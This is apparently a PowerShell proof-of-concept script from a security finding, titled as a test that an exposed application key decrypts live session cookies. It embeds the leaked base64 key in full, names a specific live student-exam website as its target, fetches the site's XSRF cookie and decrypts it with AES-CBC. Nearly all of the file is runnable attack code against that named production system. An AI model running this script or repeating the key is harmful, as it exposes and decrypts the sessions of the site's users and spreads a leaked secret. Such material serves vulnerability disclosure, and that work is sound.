# PoC 02 — APP_KEY Session Cookie Decryption Test (Masked Edition)
# Finding: CRITICAL | ID: SES-02
# Proves: Exposed APP_KEY decrypts live production session cookies
# Run: powershell -ExecutionPolicy Bypass -File .\poc_02_appkey_decrypt.ps1

Write-Host "=========================================="
Write-Host " PoC 02 — APP_KEY Session Decryption" -ForegroundColor Cyan
Write-Host " Target: https://student.citexams.in/login"
Write-Host "=========================================="
Write-Host ""

$appKeyB64 = "kbqL/05YWl0TZEnb3oE4811UauhKhWps9c4IWsQiFHQ="
$appKey    = [Convert]::FromBase64String($appKeyB64)

Write-Host "[*] Master APP_KEY Loaded from Exposed .env"
Write-Host "[*] Fetching live session cookie from server..."

try {
    $resp     = Invoke-WebRequest -Uri "https://student.citexams.in/login" -SessionVariable sess -UseBasicParsing
    $cookies  = $sess.Cookies.GetCookies("https://student.citexams.in")
    $xsrfRaw  = ($cookies | Where-Object { $_.Name -eq "XSRF-TOKEN" }).Value
    $xsrfJson = [System.Uri]::UnescapeDataString($xsrfRaw)
    $jsonText  = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($xsrfJson))
    $payload   = $jsonText | ConvertFrom-Json

    Write-Host "[+] Retrieved Cookie Payload:"
    Write-Host "    IV  : $($payload.iv)"
    Write-Host "    MAC : $($payload.mac)"
    Write-Host ""

    $iv    = [Convert]::FromBase64String($payload.iv)
    $value = [Convert]::FromBase64String($payload.value)

    $aes         = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.Key     = $appKey
    $aes.IV      = $iv

    $dec       = $aes.CreateDecryptor()
    $plain     = $dec.TransformFinalBlock($value, 0, $value.Length)
    $plaintext = [System.Text.Encoding]::UTF8.GetString($plain)

    Write-Host "[!] DECRYPTED LIVE SESSION TOKEN:" -ForegroundColor Red
    Write-Host "    $plaintext" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "[CONFIRMED] APP_KEY successfully decrypted live session cookie." -ForegroundColor Red

} catch {
    Write-Host "[ERROR] Cookie decryption failed: $_" -ForegroundColor Red
}
